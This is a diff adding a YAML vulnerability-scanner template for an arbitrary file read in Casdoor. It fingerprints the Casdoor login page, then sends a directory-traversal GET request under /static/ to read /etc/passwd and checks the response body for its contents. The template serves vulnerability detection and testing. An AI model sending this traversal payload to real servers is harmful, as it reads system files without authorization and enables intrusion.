@@ -1,0 +1,24 @@
+id: poc-yaml-casdoor-static-anyfile-read
+info:
+  name: Casdoor static 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: casdoor
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(title,"Casdoor")
+- method: GET
+  path: /static/../../../../../../../../../../../etc/passwd
+  expression: 'status_code == 200
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    && !contains(body,"<")
+
+    '
+variables: {}
+transport: http
